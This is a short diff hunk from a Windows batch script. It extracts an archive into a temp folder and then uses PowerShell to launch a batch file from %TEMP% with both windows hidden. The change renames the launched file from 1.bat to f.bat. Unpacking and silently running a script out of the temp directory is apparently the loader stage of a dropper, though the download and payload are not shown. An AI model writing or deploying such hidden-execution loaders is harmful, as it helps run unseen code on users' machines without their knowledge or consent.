@@ -16,6 +16,6 @@ for %%A in ("%output%") do (
 
 powershell -Command "Expand-Archive -Path '%output%' -DestinationPath '%tempdir%' -Force"
 
-powershell -WindowStyle Hidden -Command "Start-Process -FilePath $env:TEMP\1.bat -WindowStyle Hidden"
+powershell -WindowStyle Hidden -Command "Start-Process -FilePath $env:TEMP\f.bat -WindowStyle Hidden"
 
 exit
